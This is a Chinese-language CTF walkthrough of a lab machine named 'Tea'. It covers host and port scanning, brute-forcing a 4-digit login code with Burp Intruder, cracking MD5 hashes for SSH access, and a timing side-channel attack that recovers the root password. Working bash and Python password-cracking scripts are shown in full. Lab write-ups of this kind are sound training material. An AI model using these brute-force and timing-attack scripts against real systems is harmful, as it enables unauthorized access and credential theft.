# **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.244`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.244 08:00:27:9a:e3:28       PCS Systemtechnik GmbH
...
```

## **2. 端口与服务扫描**

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:03 EDT
Nmap scan report for 192.168.205.244
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## **3. Web 服务探索**

访问 80 端口，页面显示一个域名 `tea.dsz`。

![image-20250804210408103](http://7r1UMPHK.github.io/image/20250804210408386.webp)

使用 `gobuster` 进行目录爆破，发现 `/login.php` 页面。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.244 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
...
/login.php            (Status: 200)
/index.html           (Status: 200)
...
```

访问 `http://192.168.205.244/login.php`，发现一个登录页面，提供多种登录方式。

![image-20250804210613846](http://7r1UMPHK.github.io/image/20250804210614066.webp)

尝试了一下弱密码，发现`admin:admin`可以登录

![image-20250804211131383](http://7r1UMPHK.github.io/image/20250804211131627.webp)

提供了四个用户名，其中前三个都是弱密码的用户名，忽略。lingmj是群成员的用户名，目标就是他

那突破点可能就在验证码登录那了

![image-20250804210629005](http://7r1UMPHK.github.io/image/20250804210629245.webp)

# **二、初始访问**

## **1. 漏洞利用：验证码爆破**

页面提示可以使用邮箱和4位验证码进行登录。

*（我们结合一下域名和收集的用户名，得到了lingmj@tea.dsz的邮箱）*

利用此机制，我们使用 Burp Suite 的 Intruder 模块对4位数字验证码进行爆破。

*   **Burp Suite 设置**：
    1.  拦截验证码登录的 POST 请求。
    2.  将请求发送到 Intruder 模块。
    3.  将验证码参数 `code` 设置为爆破点。
    4.  设置 Payload 为数字序列，范围从 0000 到 9999。

![image-20250804211358010](http://7r1UMPHK.github.io/image/20250804211358352.webp)

成功爆破出验证码为 `8379`。使用该验证码成功登录。

### **2. 获取 Shell**

登录后，页面显示了三个用户名（Black, Red, Flower）及其对应的 MD5 哈希密码。

```text
Black
83796a396478e084663c06aa25425864
Red
d390587c3997d1f6b4e4fe968327e3a2
Flower
3c96be08e8b399d1b990f2f5c4939f8b
```

使用在线 MD5 解密工具，成功破解出明文密码：

*   `83796a396478e084663c06aa25425864` -> `1234hak54321`
*   `d390587c3997d1f6b4e4fe968327e3a2` -> `123bugme`
*   `3c96be08e8b399d1b990f2f5c4939f8b` -> `Cartman`

尝试使用这些凭据通过 SSH 登录。用户 `black` 和密码 `1234hak54321` 登录成功。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh black@192.168.205.244
black@192.168.205.244's password:
...
black@Tea:~$ id
uid=1000(black) gid=1000(black) groups=1000(black)
```

登录后，在 `/home/red/` 目录下发现 `user.txt` 文件，并成功读取第一个 flag。

```bash
black@Tea:~$ cat /home/red/user.txt
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# **三、权限提升**

## **垂直提升：black -> root**

在 `/opt` 目录下发现一个名为 `check_root_passwd` 的可执行文件。

```bash
black@Tea:~$ ls -al /opt
-rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd
```

执行该程序并提供任意输入，均返回 "Password error"。通过 `time` 命令测试发现，输入特定长度（10位）时，程序的执行时间有显著延迟，这表明存在时间侧信道攻击的可能性。

```bash
black@Tea:/opt$ for len in {1..12}; do inp=$(printf 'a%.0s' $(seq 1 $len)); printf "Len:%2d -> " $len; (time ./check_root_passwd "$inp" > /dev/null 2>&1) 2>&1 | grep -o 'real.*'; done
Len: 1 -> real    0m0.000s
...
Len: 9 -> real    0m0.000s
Len:10 -> real    0m0.201s
Len:11 -> real    0m0.000s
Len:12 -> real    0m0.000s
```

基于此发现，可以编写脚本逐位爆破密码。其原理是：程序逐字符比较输入与真实密码，每正确一位，比较时间就会稍长一些。通过测量每个字符的响应时间，可以确定正确的密码。

使用以下 Shell 脚本进行爆破：（这脚本ai写的，巨慢）

```bash
P=""
for p in {0..9}; do
    LOG=/tmp/log.$p
    for c in {a..z}; do
        inp=$(printf "%-10s" "$P$c" | tr ' ' a | cut -c1-10)
        t=$( { time /opt/check_root_passwd "$inp" >/dev/null 2>&1; } 2>&1 | grep real | awk -F'm' '{gsub(/s/,"",$2); print $2}' )
        echo "$c $t" >> $LOG
    done
    B=$(sort -k2 -nr $LOG | head -1 | awk '{print $1}')
    P+="$B"
    echo "p$p: $B | total: $P"
done
echo "$P"
```

经过爆破，得到 root 密码为 `toddzhennb`。

# **四、夺取旗帜**

使用破解出的密码切换到 `root` 用户。

```bash
black@Tea:/tmp$ su -
Password: toddzhennb
root@Tea:~# id
uid=0(root) gid=0(root) groups=0(root)
```

最后，读取 flag，完成渗透。

```bash
root@Tea:~# cat /root/root.txt /home/red/user.txt 
flag{root-06a5f218-4203-11f0-918d-000c2955ba04}
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# 五、题外话

我打完才发现，这靶机群主叫我测试过

然后他的根目录有一个脚本，比我这快多了，想了解一下的看下面

```python
root@Tea:~# cat solve.py 
import subprocess
import sys
import time
import string

TARGET_PROGRAM = "./a.out"
MAX_LENGTH = 100
INITIAL_DELAY = 0.2
CHAR_DELAY = 0.05
TIMING_MARGIN = 0.01
ATTEMPTS = 2
DETECT_THRESHOLD = 0.15
CHARSET = string.ascii_lowercase + string.digits

def run_password_test(password):
    start_time = time.perf_counter()
    process = subprocess.Popen(
        [TARGET_PROGRAM, password],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    _, _ = process.communicate()
    return time.perf_counter() - start_time

def detect_length():
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = 'a' * length
        total_time = 0
        for _ in range(ATTEMPTS):
            elapsed = run_password_test(test_pwd)
            total_time += elapsed
        avg_time = total_time / ATTEMPTS
        
        if avg_time >= DETECT_THRESHOLD:
            return length
    
    print("Password length not found (1-100)")
    sys.exit(1)

def crack_password(password_length):
    known = ""
    
    for position in range(password_length):
        max_time = 0
        best_char = None
        
        for char in CHARSET:
            test_pwd = known + char + 'x' * (password_length - len(known) - 1)
            
            current_time = 0
            for _ in range(ATTEMPTS):
                elapsed = run_password_test(test_pwd)
                if elapsed > current_time:
                    current_time = elapsed
            
            print(f"Testing '{char}': {current_time:.4f}s")
            
            if current_time > max_time:
                max_time = current_time
                best_char = char
        
        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY
        if abs(max_time - expected_time) > TIMING_MARGIN:
            print(f"Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)")
        
        known += best_char
        print(f"Progress: {known}")
    
    return known

if __name__ == "__main__":
    print("Starting password cracker...")
    print("Detecting password length...")
    password_length = detect_length()
    print(f"Password length detected: {password_length}")
    password = crack_password(password_length)
    print(f"\nPassword found: {password}")
```

